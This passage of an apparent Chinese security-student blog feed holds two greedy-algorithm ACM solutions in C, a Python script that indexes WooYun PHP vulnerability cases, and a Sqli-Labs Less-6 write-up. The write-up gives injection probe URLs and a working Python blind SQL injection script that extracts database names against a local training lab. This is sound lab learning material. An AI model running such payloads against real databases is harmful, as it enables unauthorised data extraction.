      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
      <category term="贪心" scheme="http://yoursite.com/tags/%E8%B4%AA%E5%BF%83/"/>
    
  </entry>
  
  <entry>
    <title>ACMXMU-OJ:1062</title>
    <link href="http://yoursite.com/2017/04/06/ACMXMU-OJ-1062/"/>
    <id>http://yoursite.com/2017/04/06/ACMXMU-OJ-1062/</id>
    <published>2017-04-06T05:50:31.000Z</published>
    <updated>2017-04-06T06:00:35.116Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>　　今天TheBeet去门口那家山东煎饼小摊买煎饼，到他付钱的时候他才发现，他的钱包里面只有一张100块。于是他需要把这张100块钱破开，但是TheBeet不喜欢硬币，另外由于某种原因，TheBeet也不喜欢20元的纸币，另外也不喜欢钱包里面有太多张纸币，所以他希望拿到尽量少的纸币数。给出摊主现有的纸币数量，求摊主要如何找零给TheBeet才能满足他的要求。<br><a id="more"></a></p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>　　输入的第一行是一个正整数N(1&lt;=N&lt;=40)，表示TheBeet买了N个山东煎饼，已知每个山东煎饼价格为2.5元。<br>　　接下来有6个非负整数，范围在[0, 1000]之内，分别表示摊主所拥有的50元、10元、5元、1元、5角、1角纸币的数量。</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>　　输出一个整数，表示TheBeet最后收到的纸币数。如果无法满足要求，那就输出-1。</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>2</p>
<p>100 100 100 100 100 100</p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>6</p>
<h2 id="HINT"><a href="#HINT" class="headerlink" title="HINT"></a>HINT</h2><p>最后TheBeet共收到50+10+10+10+10+5元钱。所以共6张纸币。</p>
<h1 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h1><p>贪心算法。背包问题。尽量选择面值大的。<br>将元转换为角，这样都是整数，进行处理更方便。</p>
<h1 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> zhibi&#123;</div><div class="line">    <span class="keyword">int</span> number;</div><div class="line">    <span class="keyword">int</span> value;</div><div class="line">&#125;zhibi;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    zhibi arr[<span class="number">7</span>];</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i].number);</div><div class="line">    &#125;</div><div class="line">    arr[<span class="number">1</span>].value = <span class="number">500</span>;</div><div class="line">    arr[<span class="number">2</span>].value = <span class="number">100</span>;</div><div class="line">    arr[<span class="number">3</span>].value = <span class="number">50</span>;</div><div class="line">    arr[<span class="number">4</span>].value = <span class="number">10</span>;</div><div class="line">    arr[<span class="number">5</span>].value = <span class="number">5</span>;</div><div class="line">    arr[<span class="number">6</span>].value = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> remainMoney;</div><div class="line">    remainMoney = <span class="number">1000</span> - n * <span class="number">25</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">int</span> j = remainMoney / arr[i].value;</div><div class="line">            <span class="keyword">int</span> number = j&gt;arr[i].number?arr[i].number:j;</div><div class="line">            remainMoney = remainMoney - number*arr[i].value;</div><div class="line">            stat = stat + number;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,stat);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;　　今天TheBeet去门口那家山东煎饼小摊买煎饼，到他付钱的时候他才发现，他的钱包里面只有一张100块。于是他需要把这张100块钱破开，但是TheBeet不喜欢硬币，另外由于某种原因，TheBeet也不喜欢20元的纸币，另外也不喜欢钱包里面有太多张纸币，所以他希望拿到尽量少的纸币数。给出摊主现有的纸币数量，求摊主要如何找零给TheBeet才能满足他的要求。&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
      <category term="贪心" scheme="http://yoursite.com/tags/%E8%B4%AA%E5%BF%83/"/>
    
  </entry>
  
  <entry>
    <title>ACMXMU-OJ:1061</title>
    <link href="http://yoursite.com/2017/04/06/ACMXMU-OJ-1061/"/>
    <id>http://yoursite.com/2017/04/06/ACMXMU-OJ-1061/</id>
    <published>2017-04-06T05:25:59.000Z</published>
    <updated>2017-04-06T05:51:03.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>　　今天Ckp打算去约会。大家都知道Ckp是超级大帅哥，所以和他约会的MM也超级多，她们每个人都和Ckp订了一个约会时间。但是今天Ckp刚打算出门的时候才发现，某几个MM的约会时间有冲突。由于Ckp不会分身，还不能和多个MM同时约会，他只能忍痛割爱拒绝掉某些MM。但是Ckp这个花心大萝卜还是不死心，他想知道，他最多可以和多少个MM约会。<br><a id="more"></a></p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>　　输入的第一行包含一个正整数N(0&lt;N&lt;=1000)，表示和Ckp约会的MM数。接下去N行，每行描述一个MM，格式为: Name starttime endtime，表示在[starttime,endtime)这个半开区间是这个MM的约会时间，starttime &lt; endtime。名字由大写或小写字母组成，最长不超过15个字母，保证没有两个人拥有相同的名字，所有时间采用24小时制，格式为XX:XX，且在06:00到23:00之间。</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>　　输出的第一行是一个整数M表示Ckp最多可以和多少个MM约会。<br>　　接下来那一行就是M个MM的名字，用空格隔开。您可以按照任意的顺序输出。如果存在多个答案，您可以任选一个输出。</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>Lucy 06:00 10:00</p>
<p>Lily 10:00 17:00</p>
<p>HanMeimei 16:00 21:00</p>
<p>Kate 11:00 13:00</p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>3</p>
<p>Lucy Kate HanMeimei</p>
<h1 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h1><p>贪心算法。其实就是任务选择问题。</p>
<ul>
<li>按照约会完成时间从早到晚排序</li>
<li>选择具有最早完成时间的girl</li>
<li>将此girl加入到约会列表中</li>
<li>对子问题重复上述问题</li>
<li>强烈谴责Ckp</li>
</ul>
<h1 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> info&#123;</div><div class="line">    <span class="keyword">char</span>  name[<span class="number">16</span>];</div><div class="line">    <span class="keyword">char</span>  starttime[<span class="number">6</span>];</div><div class="line">    <span class="keyword">char</span>  endtime[<span class="number">6</span>];</div><div class="line">&#125;info;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info * s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">static</span> info mm[<span class="number">1005</span>] ;</div><div class="line">    <span class="keyword">static</span> info mmcopy[<span class="number">1005</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s%s%s"</span>,mm[i].name,mm[i].starttime,mm[i].endtime);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(mm,<span class="number">1</span>,n,n);</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].endtime,mm[<span class="number">1</span>].endtime);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].name,mm[<span class="number">1</span>].name);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].starttime,mm[<span class="number">1</span>].starttime);</div><div class="line">    <span class="keyword">int</span> cal = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(mmcopy[cal].endtime,mm[i].starttime) &lt;= <span class="number">0</span>)&#123;</div><div class="line">            cal++;</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].endtime,mm[i].endtime);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].name,mm[i].name);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].starttime,mm[i].starttime);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,cal);</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; cal; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s "</span>,mmcopy[i].name);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,mmcopy[i].name);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info* s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)&#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        info x;</div><div class="line">        <span class="built_in">strcpy</span>(x.endtime,s[l].endtime);</div><div class="line">        <span class="built_in">strcpy</span>(x.name,s[l].name);</div><div class="line">        <span class="built_in">strcpy</span>(x.starttime,s[l].starttime);</div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[j].endtime,x.endtime) &gt;= <span class="number">0</span>)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                <span class="built_in">strcpy</span>(s[i].endtime,s[j].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].starttime,s[j].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].name , s[j].name);</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[i].endtime,x.endtime) &lt; <span class="number">0</span>)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line"></div><div class="line">                <span class="built_in">strcpy</span>(s[j].endtime,s[i].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].starttime,s[i].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].name,s[i].name);</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(s[i].endtime,x.endtime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].starttime,x.starttime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].name,x.name);</div><div class="line"></div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>,n);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r,n);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;　　今天Ckp打算去约会。大家都知道Ckp是超级大帅哥，所以和他约会的MM也超级多，她们每个人都和Ckp订了一个约会时间。但是今天Ckp刚打算出门的时候才发现，某几个MM的约会时间有冲突。由于Ckp不会分身，还不能和多个MM同时约会，他只能忍痛割爱拒绝掉某些MM。但是Ckp这个花心大萝卜还是不死心，他想知道，他最多可以和多少个MM约会。&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
      <category term="贪心" scheme="http://yoursite.com/tags/%E8%B4%AA%E5%BF%83/"/>
    
  </entry>
  
  <entry>
    <title>利用python为1000php生成目录页面</title>
    <link href="http://yoursite.com/2017/04/03/%E5%88%A9%E7%94%A8python%E4%B8%BA1000php%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E9%A1%B5%E9%9D%A2/"/>
    <id>http://yoursite.com/2017/04/03/利用python为1000php生成目录页面/</id>
    <published>2017-04-03T04:34:58.000Z</published>
    <updated>2017-04-03T04:57:29.998Z</updated>
    
    <content type="html"><![CDATA[<p>1000php是指1000个PHP代码审计案例，来自2016.7以前乌云公开漏洞。<br>github地址： <a href="https://github.com/Xyntax/1000php" target="_blank" rel="external">https://github.com/Xyntax/1000php</a><br><a id="more"></a><br>git clone下来后，案例保存在bugs文件夹里，名称都是wooyun-xxx-xxxxx格式，没有索引，从名字上看也难以知道这是什么类型的漏洞。所以这里为它生成一个目录页面。</p>
<h1 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h1><p>漏洞的简要信息保存在页面的title标签中，如下<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/wooyundrop/pic1.jpg" alt=""><br>使用BeautifulSoup来对wooyun-xxx-xxxxx.html进行解析，获取其title。如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/wooyundrop/pic2.jpg" alt=""></p>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</div><div class="line"></div><div class="line">htmlName = os.listdir(htmlLoc)</div><div class="line">indexhtml = open(<span class="string">"index.html"</span>,<span class="string">"w"</span>)</div><div class="line"></div><div class="line">setCharset = <span class="string">'&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt; &lt;/head&gt;'</span></div><div class="line">indexhtml.write(setCharset)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> htmlName:</div><div class="line">	<span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'w'</span>:</div><div class="line">		soup = BeautifulSoup(open(i),<span class="string">"html.parser"</span>)</div><div class="line">		url =<span class="string">'&lt;a href="'</span>+i+<span class="string">'"&gt;'</span>+soup.title.string+<span class="string">'&lt;/a&gt;'</span></div><div class="line">		indexhtml.write(url)</div><div class="line">		indexhtml.write(<span class="string">"&lt;/br&gt;"</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"done!"</span></div></pre></td></tr></table></figure>
<h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><p>将代码保存为py文件后，放在bugs文件夹下运行，会生成index.html文件。打开。<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/wooyundrop/pic3.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;1000php是指1000个PHP代码审计案例，来自2016.7以前乌云公开漏洞。&lt;br&gt;github地址： &lt;a href=&quot;https://github.com/Xyntax/1000php&quot;&gt;https://github.com/Xyntax/1000php&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="脚本" scheme="http://yoursite.com/tags/%E8%84%9A%E6%9C%AC/"/>
    
      <category term="beautifulsoup" scheme="http://yoursite.com/tags/beautifulsoup/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less6-writeup</title>
    <link href="http://yoursite.com/2017/04/03/Sqli-Labs-Less6-writeup/"/>
    <id>http://yoursite.com/2017/04/03/Sqli-Labs-Less6-writeup/</id>
    <published>2017-04-03T02:37:04.000Z</published>
    <updated>2017-04-03T02:46:29.655Z</updated>
    
    <content type="html"><![CDATA[<p>第六关是盲注<br><a id="more"></a></p>
<h1 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/sqlilabsless6/step1.jpg" alt=""></p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>无报错</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>页面报错，返回信息： use near ‘“1”” LIMIT 0,1’ at line 1。需要闭合双引号。</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=1 --+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>页面返回正常</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=2 --+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>返回错误页面（空白）</p>
<h1 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h1><p>采用盲注。分析同Less5。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">'http://localhost:20000/sqllab/Less-6/?id=1" '</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第六关是盲注&lt;br&gt;
    
    </summary>
    
